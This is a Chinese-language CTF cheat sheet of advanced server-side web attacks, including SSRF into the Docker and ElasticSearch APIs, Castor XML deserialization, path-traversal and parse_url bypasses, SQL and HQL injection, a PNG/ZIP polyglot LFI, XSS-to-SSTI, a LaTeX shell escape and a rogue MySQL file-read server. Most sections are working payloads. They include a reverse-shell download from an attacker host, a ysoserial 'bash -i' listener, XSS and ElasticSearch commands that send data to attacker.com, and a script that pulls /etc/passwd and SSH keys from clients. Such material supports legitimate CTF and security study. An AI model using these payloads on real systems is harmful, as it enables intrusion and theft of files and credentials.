# CTF Web - 进阶服务端技巧（第 2 部分）

## 目录
- [SSRF 打 Docker API 的 RCE 链（H7CTF 2025）](#ssrf-打-docker-api-的-rce-链h7ctf-2025)
- [Castor XML 的 xsi:type 多态反序列化（Atlas HTB）](#castor-xml-的-xsitype-多态反序列化atlas-htb)
- [Apache ErrorDocument 表达式读文件（Zero HTB）](#apache-errordocument-表达式读文件zero-htb)
- [SQLite 文件路径穿越绕过字符串相等判断（Codegate 2013）](#sqlite-文件路径穿越绕过字符串相等判断codegate-2013)
- [利用不间断空格做 HQL 注入（HackIM 2016）](#利用不间断空格做-hql-注入hackim-2016)
- [Base64 编码的路径穿越（Sharif CTF 2016）](#base64-编码的路径穿越sharif-ctf-2016)
- [Windows 8.3 短文件名绕过路径穿越（Tokyo Westerns 2016）](#windows-83-短文件名绕过路径穿越tokyo-westerns-2016)
- [URL parse_url() 的 @ 符号绕过（EKOPARTY CTF 2016）](#url-parse_url-的--符号绕过ekoparty-ctf-2016)
- [PHP zip:// 包装器 + PNG/ZIP 多格式文件做 LFI（PlaidCTF 2016）](#php-zip-包装器--pngzip-多格式文件做-lfiplaidctf-2016)
- [XSS 经 Flask 错误页升级为 SSTI（SECUINSIDE 2016）](#xss-经-flask-错误页升级为-sstisecuinside-2016)
- [INSERT INTO 双字段 SQLi 列位移（CyberSecurityRumble 2016）](#insert-into-双字段-sqli-列位移cybersecurityrumble-2016)
- [时间戳作种子的 PRNG 伪造 Session Cookie（CyberSecurityRumble 2016）](#时间戳作种子的-prng-伪造-session-cookiecybersecurityrumble-2016)
- [parse_url/curl 解析差异导致的 SSRF（33C3 CTF 2016）](#parse_urlcurl-解析差异导致的-ssrf33c3-ctf-2016)
- [LaTeX 借 mpost 绕过受限 write18 实现 RCE（33C3 CTF 2016）](#latex-借-mpost-绕过受限-write18-实现-rce33c3-ctf-2016)
- [经 SSRF 打 ElasticSearch Groovy script_fields 的 RCE（VolgaCTF 2017）](#经-ssrf-打-elasticsearch-groovy-script_fields-的-rcevolgactf-2017)
- [恶意 MySQL 服务端借 LOAD DATA LOCAL 读客户端文件（VolgaCTF 2018）](#恶意-mysql-服务端借-load-data-local-读客户端文件volgactf-2018)

另见：[server-side-advanced.md](server-side-advanced.md) 为第 1 部分（ExifTool、Go rune/byte 不一致、zip 符号链接穿越、路径穿越绕过、Flask/Werkzeug debug、XXE 外部 DTD、WeasyPrint SSRF、MongoDB 正则注入、Pongo2 SSTI、ZIP PHP webshell、basename() 绕过、React Server Components Flight RCE）。

---

<a id="ssrf-to-docker-api-rce-chain-h7ctf-2025"></a>
## SSRF 打 Docker API 的 RCE 链（H7CTF 2025）

**模式（Moby Dock）：** Web 应用有 SSRF，且 2375 端口暴露了未鉴权的 Docker daemon API。通过内部代理端点转发 POST，把 SSRF 串成完整 RCE。

**第 1 步 —— 用 SSRF 探测内网服务：**
```bash
# Enumerate localhost ports through SSRF
curl "http://target/validate?url=http://localhost:2375/version"
curl "http://target/validate?url=http://localhost:8090/docs"
```

**第 2 步 —— 用 Docker archive 端点取运行中容器里的文件：**
```bash
# List containers
curl "http://target/validate?url=http://localhost:2375/containers/json"

# Read files from container filesystem (returns tar archive)
curl "http://target/validate?url=http://localhost:2375/v1.51/containers/<container_id>/archive?path=/flag.txt"
```

**第 3 步 —— 用 Docker exec API 执行命令（需要 POST 转发）：**

当 SSRF 只允许 GET 时，去找能转发 POST 的内部端点（例如 `/request?method=post&data=...&url=...`）。

```bash
# 1. Create exec instance
curl "http://target/validate?url=http://localhost:8090/request?method=post\
&data={\"AttachStdout\":true,\"Cmd\":[\"cat\",\"/flag.txt\"]}\
&url=http://localhost:2375/v1.51/containers/<id>/exec"
# Returns: {"Id": "<exec_id>"}

# 2. Start exec instance
curl "http://target/validate?url=http://localhost:8090/request?method=post\
&data={\"Detach\":false,\"Tty\":false}\
&url=http://localhost:2375/v1.51/exec/<exec_id>/start"
```

**获取反弹 shell：**
```bash
# 1. Download shell script into container
# Cmd: ["wget", "http://attacker/shell.sh", "-O", "/tmp/shell.sh"]

# 2. Execute with sh (not bash — busybox containers lack bash)
# Cmd: ["sh", "/tmp/shell.sh"]
```

**Docker API 关键端点：**
| 端点 | 方法 | 用途 |
|----------|--------|---------|
| `/version` | GET | 确认 Docker API 可访问 |
| `/containers/json` | GET | 列出运行中的容器 |
| `/containers/<id>/archive?path=<path>` | GET | 取任意文件（tar 格式） |
| `/containers/<id>/exec` | POST | 创建 exec 实例 |
| `/exec/<id>/start` | POST | 启动 exec 实例 |
| `/images/json` | GET | 列出可用镜像 |
| `/containers/create` | POST | 创建新容器 |

**关键点：** 2375 端口上的未鉴权 Docker daemon 等于完全接管容器。当 SSRF 只允许 GET 时，去找能转发 POST 的内部代理或请求中继端点。在精简容器（busybox、alpine）里用 `sh`，不要用 `bash`。

---

<a id="castor-xml-deserialization-via-xsitype-polymorphism-atlas-htb"></a>
## Castor XML 的 xsi:type 多态反序列化（Atlas HTB）

**模式：** Castor XML 的 `Unmarshaller` 在没有映射文件时会信任 `xsi:type` 属性，从而允许实例化任意 Java 类。

**攻击链：** `xsi:type` → `PropertyPathFactoryBean` + `SimpleJndiBeanFactory` → JNDI/RMI → ysoserial JRMP listener → `CommonsBeanutils1` gadget → RCE

**前提：** Java 11（不是 17+）—— 受模块访问限制，ysoserial 的 gadget 在 Java 17+ 上会失败。

**用于 RMI 回调的 Spring bean XML 载荷示例：**
```xml
<data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns:java="http://java.sun.com">
  <item xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean">
    <targetBeanName>
      <item xsi:type="java:org.springframework.jndi.support.SimpleJndiBeanFactory">
        <shareableResources>rmi://ATTACKER:1099/exploit</shareableResources>
      </item>
    </targetBeanName>
    <propertyPath>foo</propertyPath>
  </item>
</data>
```

```bash
# Start ysoserial JRMP listener
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 'bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}'
```

**关键点：** 没有显式映射文件的 Castor XML 实际上就是一个 XML 版的反序列化 sink。`xsi:type` 属性相当于 Java 的 `ObjectInputStream` —— classpath 上的任何类都能被实例化。检查 `pom.xml` 里是否有 `castor-xml`、`commons-beanutils`、`commons-collections` 依赖。JNDI（Java 命名与目录接口）经 RMI（远程方法调用）提供回调通道。

**识别特征：** Java 应用用 Castor XML 做反序列化，`pom.xml` 里有 `castor-xml`、`commons-beanutils`/`commons-collections`。

---

<a id="apache-errordocument-expression-file-read-zero-htb"></a>
## Apache ErrorDocument 表达式读文件（Zero HTB）

**模式：** Apache 的 `ErrorDocument` 指令支持表达式语法，由 Apache 自身读文件，绕过了 PHP 引擎禁用。

**前提：** userdir 配置中有 `AllowOverride FileInfo`。

**攻击链：**
1. 通过 SFTP（安全文件传输协议）上传 `.htaccess` 到子目录：
```apache
ErrorDocument 404 "%{file:/etc/passwd}"
```
2. 请求该目录下不存在的 URL 触发 404 处理器
3. 用 `cat -v` 看原始源码：
```apache
ErrorDocument 404 "%{file:/var/www/html/stats.php}"
```

**关键点：** 即使 `php_admin_flag engine off` 禁用了用户目录里的 PHP 执行也有效。`%{file:...}` 表达式由 Apache 自身求值，与 PHP 无关，所以 PHP 禁用标志毫无作用。

**识别特征：** Apache 开启 `mod_userdir`、`AllowOverride FileInfo`、子目录 `.htaccess` 可写。

---

<a id="sqlite-file-path-traversal-to-bypass-string-equality-codegate-2013"></a>
## SQLite 文件路径穿越绕过字符串相等判断（Codegate 2013）

**模式：** PHP 用字符串相等判断封禁某个输入值，随后又把它拼进文件路径。路径归一化让被封禁的资源在通过字符串检查后被解析到。

**脆弱代码：**
```php
if ($_POST['name'] == "GM") die("you can not view&save with 'GM'");
$db = sqlite_open("/var/game_db/gamesim_" . $_SESSION['scrap'] . ".db");
```

**利用：** 把 `name` 设为 `/../gamesim_GM` —— 它不满足 `== "GM"`，但拼出的路径 `/var/game_db/gamesim_/../gamesim_GM.db` 归一化后正是 `/var/game_db/gamesim_GM.db`。

```bash
curl -X POST -b 'session=...' \
  -d 'name=/../gamesim_GM' \
  'http://target/view.php'
```

**关键点：** 只要用户输入后面被拼进会做归一化的文件系统路径、数据库路径或 URL，字符串相等检查就能被绕过。`../` 对字符串比较不可见，却会被操作系统解析。凡是"先做字符串校验、再把输入拼进路径"的地方都要留意这种模式。

---

<a id="hql-injection-via-non-breaking-space-hackim-2016"></a>
## 利用不间断空格做 HQL 注入（HackIM 2016）

Hibernate 查询语言（HQL）禁止子查询。利用 HQL 解析器与底层数据库（H2）之间的字符编码差异绕过：

- HQL 解析器把不间断空格（U+00A0）当普通字符，会把 token 粘连成一个词
- H2 数据库把 U+00A0 当作空白，正常切分 token

**关键点：** 把 SQL 子查询里的空格换成 U+00A0，就能骗过 HQL 校验。

```python
val = u'\u00a0'  # non-breaking space
# HQL sees: "selectXflagXfromXflagXlimitX1" (one token)
# H2 sees:  "select flag from flag limit 1" (valid SQL)
payload = u"' and (cast(concat('->', (select{0}flag{0}from{0}flag{0}limit{0}1)) as int))=0 or ''='".format(val)
```

基于报错提取：把结果 cast 成 int 触发错误，错误信息里就带着 flag。

---

<a id="base64-encoded-path-traversal-sharif-ctf-2016"></a>
## Base64 编码的路径穿越（Sharif CTF 2016）

当文件包含以 base64 编码的文件名为参数时：

```text
file.php?page=aGVscC5wZGY=    (decodes to "help.pdf")
```

把穿越载荷也做 base64 编码：

```python
import base64
# ../index.php
print(base64.b64encode(b"../index.php").decode())  # Li4vaW5kZXgucGhw
# ../../etc/passwd
print(base64.b64encode(b"../../etc/passwd").decode())  # Li4vLi4vZXRjL3Bhc3N3ZA==
```

**关键点：** base64 编码能把过滤规则可能拦截的 `../` 字符"吸收"进去。

---

<a id="windows-83-short-filename-path-traversal-bypass-tokyo-westerns-2016"></a>
## Windows 8.3 短文件名绕过路径穿越（Tokyo Westerns 2016）

在 Windows 上，长文件名会自动生成 8.3 短名别名。当黑名单检查全名时，用短名即可绕过。

```text
# Blacklisted file: file_list (e.g., readfile('file_list') is blocked)
# Windows 8.3 short name: file_l~1

# Bypass:
GET /read?file=file_l~1

# How 8.3 names are generated:
# - First 6 chars of name (minus spaces/special chars) + ~1
# - Extension truncated to 3 chars
# Examples:
#   "file_list.txt"     -> "FILE_L~1.TXT"
#   "longfilename.html" -> "LONGFI~1.HTM"
#   "program files"     -> "PROGRA~1"

# Discovery: use dir /x on Windows to list short names
# dir /x C:\path\to\files\
```

**关键点：** NTFS 为兼容性自动生成 8.3 短文件名。只检查全名的黑名单看不到短名别名。在启用 8.3 名称生成（默认开启）的任意 Windows Web 服务器（IIS、WAMP 等）上都适用。

---

<a id="url-parse_url--symbol-bypass-ekoparty-ctf-2016"></a>
## URL parse_url() 的 @ 符号绕过（EKOPARTY CTF 2016）

PHP 的 `parse_url()` 把 `@` 当作用户信息分隔符，`@` 之前是凭据，`@` 之后是主机。这可以绕过 URL 校验。

```php
// Server validates URL host must be ctf.example.com
// parse_url("http://attacker.com@ctf.example.com/")
//   -> host: ctf.example.com (passes validation)

// But wget/curl follow RFC and connect to attacker.com:
// wget "http://attacker.com@ctf.example.com/"
//   -> Actually connects to: attacker.com

// Exploit for URL shortener/fetcher:
$url = "http://{$attacker_ip}@ctf.ekoparty.org/?";
// parse_url() sees host = ctf.ekoparty.org (passes whitelist)
// wget connects to $attacker_ip (attacker-controlled)

// Check attacker's Apache logs for the flag in User-Agent or request
```

**关键点：** `parse_url()` 与实际 HTTP 客户端（wget、curl、浏览器）对 URL 中 `@` 的处理不一致。`parse_url()` 取 `@` 之后的主机，而 HTTP 客户端可能连 `@` 之前的主机。这个 SSRF 向量可以绕过域名白名单校验。

---

<a id="php-zip-wrapper-lfi-via-pngzip-polyglot-plaidctf-2016"></a>
## PHP zip:// 包装器 + PNG/ZIP 多格式文件做 LFI（PlaidCTF 2016）

**模式（pixelshop）：** PHP `include()` 会追加 `.php` 后缀（现代 PHP 无空字节截断）。上传被限制为合法图片（.png）。用 `zip://` 包装器包含藏在 PNG 内嵌 ZIP 归档中的 PHP 代码。

1. 用 `php://filter/read=convert.base64-encode/resource=` 泄露源码，搞清 include 逻辑
2. 上传一张合法 PNG，拿到服务器上的已知文件名
3. 把 ZIP 归档注入 PNG 的调色板数据（ZIP 从文件末尾读中央目录，所以合法的 PNG 可以同时是合法的 ZIP）：

```python
import binascii, requests, struct

def craft_png_zip_polyglot(php_payload):
    """Craft a ZIP payload to inject into PNG palette bytes."""
    # ZIP stores its central directory at the end of the file
    # Calculate offsets based on the known PNG prefix length
    # The ZIP's local file header offset points into the palette region
    # php_payload goes inside the ZIP as "s.php"

    # Pre-built ZIP with s.php containing: <?=`$_GET[a]`?>
    zip_hex = (
        "504B0304140000000800"  # Local file header
        # ... compressed PHP shell ...
        "504B01021400140000000800"  # Central directory
        # ... points back to local header at palette offset ...
        "504B0506000000000100010033000000690000000000"  # End of central directory
    )
    return zip_hex

def inject_payload(image_key, payload_hex):
    """Use the image editor API to set palette bytes containing the ZIP."""
    palette_bytes = binascii.unhexlify(payload_hex)
    # Convert to RGB triplets for palette API
    colors = []
    for i in range(0, len(palette_bytes), 3):
        chunk = palette_bytes[i:i+3].ljust(3, b'\x00')
        colors.append(f'"#{chunk[0]:02x}{chunk[1]:02x}{chunk[2]:02x}"')
    palette_json = ",".join(colors)
    # POST to save endpoint with crafted palette
    requests.post(f"{base_url}?op=save", data={
        "imagekey": image_key,
        "savedata": f'{{"pal": [{palette_json}], "im": [{",".join(["0"]*1024)}]}}'
    })
```

4. 通过 zip:// 包装器包含内嵌的 PHP 文件：
```text
http://target/?op=zip://uploads/HASH.png%23s
```
这会把 `HASH.png`（同时也是合法 ZIP）解压并包含其中的 `s.php`。

**关键点：** ZIP 把中央目录放在文件末尾，所以任何文件格式都能在末尾附加（或内嵌）一个合法 ZIP 而不破坏原格式。PHP 的 `zip://` 包装器不看扩展名，按内容解压。PNG 调色板数据提供了可控的连续字节，非常适合塞进小体积 ZIP 载荷。这同时绕过了：(a) 扩展名限制（.php → .png），(b) 图片校验（文件仍是合法 PNG），(c) 元数据清洗（调色板是结构数据，不是元数据）。

---

<a id="xss-to-ssti-chain-via-flask-error-pages-secuinside-2016"></a>
## XSS 经 Flask 错误页升级为 SSTI（SECUINSIDE 2016）

**模式（SBBS）：** Flask 应用用 `render_template_string()` 渲染 404 错误信息，并把请求 URL 拼进模板。错误页只对 localhost 请求渲染。把 XSS → localhost 请求 → 错误页 SSTI 串起来。

1. Flask 错误处理器直接把 URL 拼进模板：
```python
@app.errorhandler(404)
def not_found(e=None):
    message = "%s was not found on the server." % request.url
    return render_template_string(template % message), 404
```

2. 错误页只对 127.0.0.1 渲染（外部 IP 拿到的是 nginx 的 404）

3. XSS 载荷触发带 SSTI 的 localhost 请求：
```javascript
<script>
function hack(url, callback){
    var x = new XMLHttpRequest();
    x.onreadystatechange = function(){
        if (x.readyState == 4)
            window.open('http://attacker.com/exfil?' + x.responseText, '_self', false)
    }
    x.open("GET", url, true);
    x.send();
}
hack("/{{ config.from_object('admin.app') }}{{ config.FLAG }}")
</script>
```

4. `config.from_object('module.path')` 把应用配置（含密钥）加载进来

**关键点：** Flask 的模板全局变量不直接暴露 `app` 对象，但 `config.from_object()` 能把任意 Python 模块加载进 config 字典，其属性可通过 `{{ config.KEY }}` 读取。这条 XSS-to-SSTI 链同时绕过了两个限制：(a) SSTI 只在 localhost 错误页可用，(b) 模板全局变量拿不到 app 对象。留意错误处理器里把用户输入交给 `render_template_string()` 的写法。

---

<a id="insert-into-dual-field-sqli-column-shift-cybersecurityrumble-2016"></a>
## INSERT INTO 双字段 SQLi 列位移（CyberSecurityRumble 2016）

**模式（Illuminati）：** INSERT 查询有两个可注入字段（subject 限 40 字符，message 不限长）。在两个字段间接力注入，绕过长度限制。

```sql
-- Original query:
INSERT INTO requests (id, "$subject", "$message")

-- Subject (40 chars max):
theSubject",concat(

-- Message (unlimited):
,(select group_concat(table_name) from information_schema.tables)))#

-- Result:
INSERT INTO requests (id, "theSubject",concat("",(select group_concat(...))))#"...")
```

`concat("", (select ...))` 把子查询结果包成字符串写进 subject 列，用户查看自己的消息时就能看到。

**关键点：** 当 INSERT 有多个可注入字段但其中一个限长时，用受限字段开一个 `concat(` 表达式，用不限长字段闭合它并塞入任意子查询。这种"列位移"技巧把数据提取从未限字段转移到不受限字段。用 `CASE WHEN` 或其他能跨字段边界的 SQL 表达式的模式同样成立。

---

<a id="session-cookie-forgery-via-timestamp-seeded-prng-cybersecurityrumble-2016"></a>
## 时间戳作种子的 PRNG 伪造 Session Cookie（CyberSecurityRumble 2016）

**模式（Illuminati）：** Session cookie 构造为 `random_int-user_id`，其中 `random_int` 以用户上次登录时间戳为种子。通过 SQLi 拿到管理员的时间戳，复现 PRNG 伪造其 cookie。

```python
import random

# 1. Extract admin login timestamp via SQLi
admin_timestamp = 1229569179  # from: SELECT last_login FROM users WHERE id=209

# 2. Seed PRNG with timestamp
random.seed(admin_timestamp)

# 3. Generate the same random int the server produced
cookie_random = random.randint(0, 2**31)

# 4. Forge admin cookie
admin_cookie = f"{cookie_random}-209"
# Result: "1229569179-209"
```

**关键点：** 用时间戳做 Session token 的随机种子等于制造了一个确定性 oracle。只要登录时间戳泄露（SQLi、报错、API 响应），整个 token 就可以复现。凡是 session 随机性依赖单一可预测种子的地方（时间、PID、计数器）都有此问题。留意 session 生成代码里的 `random.seed(time())` 或 `srand(time(NULL))`。

---

<a id="ssrf-via-parse_urlcurl-url-parsing-discrepancy-33c3-ctf-2016"></a>
## parse_url/curl 解析差异导致的 SSRF（33C3 CTF 2016）

**模式（list0r）：** PHP `parse_url()` 与 curl 对含多个 `@` 的 URL 解释不同。URL `http://what:ever@127.0.0.1:80@allowed.host/path` 让 PHP 看到 `host = allowed.host`（通过 CIDR/域名白名单），而 curl 解析到 `127.0.0.1:80`（把第二个 `@` 当字面量），从而 SSRF 访问 localhost。

```php
// PHP parse_url behavior:
parse_url("http://what:ever@127.0.0.1:80@allowed.host/path");
// => ['host' => 'allowed.host', 'user' => 'what', ...]

// curl behavior with same URL:
// Connects to 127.0.0.1:80 (first @ delimits credentials)
// "ever@127.0.0.1:80" parsed as password, but curl connects to first IP

// Exploit: bypass CIDR blacklist by making parse_url see whitelisted host
$url = "http://x:x@127.0.0.1:80@" . $allowed_domain . "/secret/flag";
// parse_url sees $allowed_domain -> passes check
// curl connects to 127.0.0.1:80 -> SSRF achieved
```

**关键点：** URL 解析器对多个 `@` 的处理不一致。这与单 `@` 绕过（EKOPARTY 2016）不同 —— 这里是双 `@` 触发了另一种解析歧义：`parse_url` 把最后一个 `@` 当用户信息分隔符，而 curl 用第一个。面对 URL 型 SSRF 过滤时两种变体都要测。

---

<a id="latex-rce-via-mpost-restricted-write18-bypass-33c3-ctf-2016"></a>
## LaTeX 借 mpost 绕过受限 write18 实现 RCE（33C3 CTF 2016）

**模式（pdfmaker）：** 当 `pdflatex` 以受限模式运行 `write18`（只允许 `mpost` 等白名单命令）时，利用 `mpost` 的 `-tex` 参数指定替代的 TeX 处理器 —— 设成 `bash -c (command)` 即可执行 shell。因为 mpost 的参数解析会去掉空格，用 `${IFS}` 代替空格。

```latex
% Create a MetaPost file via LaTeX
\begin{filecontents}{test.mp}
beginfig(1); endfig; end;
\end{filecontents}

% Execute mpost with bash as the "TeX processor"
\immediate\write18{mpost -ini "-tex=bash -c (cat${IFS}/flag)>out.log" "test.mp"}

% Read the output back into the PDF
\input{out.log}
```

**关键点：** `mpost` 因为 MetaPost 绘图需要被受限 `write18` 放行。但它的 `-tex` 参数允许把任意程序指定为"TeX 处理器"，包括 `bash`。受限的 shell escape 就此变成完整 RCE。`${IFS}` 用来在带引号参数中替代空格。

---

<a id="elasticsearch-groovy-script_fields-rce-via-ssrf-volgactf-2017"></a>
## 经 SSRF 打 ElasticSearch Groovy script_fields 的 RCE（VolgaCTF 2017）

**模式：** SSRF 能访问到内网 ElasticSearch（默认 9200）时，`script_fields` 中的 Groovy 脚本可导致远程代码执行。ElasticSearch 5.0 之前默认允许内联 Groovy 脚本。

```bash
# SSRF payload to ElasticSearch internal API
curl 'http://localhost:9200/_search' -d '{
  "script_fields": {
    "exec": {
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"
    }
  }
}'

# Read a specific file
curl 'http://localhost:9200/_search' -d '{
  "script_fields": {
    "read": {
      "script": "new java.io.File(\"/flag.txt\").text"
    }
  }
}'

# For blind RCE, exfiltrate via curl upload
curl 'http://localhost:9200/_search' -d '{
  "script_fields": {
    "exfil": {
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"curl --upload-file /flag attacker.com:4042\").getText()"
    }
  }
}'
```

**经 SSRF（URL 编码后放入 GET 参数）：**
```python
import requests
import urllib.parse

es_payload = '{"script_fields":{"exec":{"script":"new java.io.File(\\"/flag.txt\\").text"}}}'
ssrf_url = f"http://localhost:9200/_search?source={urllib.parse.quote(es_payload)}&source_content_type=application/json"

# Through SSRF endpoint
r = requests.get(f"http://target/fetch?url={urllib.parse.quote(ssrf_url)}")
print(r.text)
```

**识别特征：** 存在 SSRF + 内网 9200 端口服务。用 `http://localhost:9200/`（返回 ES 版本信息）或 `http://localhost:9200/_cat/indices`（列出索引）确认。

**关键点：** 5.0 之前的 ElasticSearch 通过 `_search` API 暴露 Groovy 脚本能力。即使无法直连，SSRF 打通 9200 端口也能借 `script_fields` 达到完整 RCE。现代 ES 默认禁用内联脚本。测 SSRF 时永远要探一下 9200 端口 —— ElasticSearch 是常见的内部服务，且脚本执行能力极强。

---

<a id="rogue-mysql-server-load-data-local-file-read-volgactf-2018"></a>
### 恶意 MySQL 服务端借 LOAD DATA LOCAL 读客户端文件（VolgaCTF 2018）

**模式：** 当某个服务连接到你控制的 MySQL 服务端且启用了 `LOAD DATA LOCAL` 时，发一个伪造响应，要求读取客户端机器上的任意文件。MySQL 协议允许服务端在 `LOAD DATA LOCAL INFILE` 握手期间请求客户端发送任意本地文件，与客户端本来想执行的查询无关。

**原理：**
1. 受害应用连接到攻击者控制的 MySQL 服务端（例如通过 SSRF 或配置错误的 DB host）
2. 攻击者服务端正常完成握手
3. 客户端发来任意查询时，恶意服务端回一个文件传输请求包
4. 客户端读取被请求的本地文件并把内容发给服务端

```python
# Rogue MySQL server — simplified core logic
import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 3306))
server.listen(1)
conn, addr = server.accept()

# Send server greeting (MySQL handshake)
greeting = bytes.fromhex(
    '4a0000000a352e362e32382d'  # version 5.6.28
    '307562756e747530'          # ubuntu0
    '2e31342e30342e31'          # .14.04.1
    '001d000000'                # connection id
    '2a5e2a683e6a2b29'          # auth plugin data part 1
    '00fff70800'                # capability flags
    '210000000000000000000000'  # more fields
    '00'
    '282a4e3b3a592635254a2944'  # auth plugin data part 2
    '00'
)
conn.send(greeting)

# Receive client auth response
conn.recv(4096)

# Send OK packet (auth success)
conn.send(bytes.fromhex('0700000200000002000000'))

# Wait for client to send a query
conn.recv(4096)

# Check client capability bit "Can Use LOAD DATA LOCAL: Set"
# Send rogue file read request for /etc/passwd
dump_etc_passwd = bytes.fromhex('0c000001fb2f6574632f706173737764')
conn.send(dump_etc_passwd)  # rogue MySQL file read request

# Receive file contents from client
file_data = conn.recv(65535)
print(f"[+] Received file contents:\n{file_data.decode(errors='replace')}")

conn.close()
```

**值得请求的文件：**
```text
/etc/passwd                    # User enumeration
/etc/shadow                    # Password hashes (if client runs as root)
/proc/self/environ             # Environment variables with secrets
/var/www/html/config.php       # Application config with DB credentials
/home/user/.ssh/id_rsa         # SSH private keys
/flag.txt                      # CTF flag
```

**关键点：** 恶意 MySQL 服务端可以通过 LOAD DATA LOCAL 协议要求连接的客户端发送任意本地文件，与客户端想执行的查询无关。原因在于 MySQL 协议允许服务端对任意客户端查询回以文件传输请求。留意那些你能控制服务端所连 MySQL host 的题（SSRF、配置注入、DNS rebinding）。客户端必须启用了 `LOAD DATA LOCAL`（很多 MySQL 客户端库默认开启）。
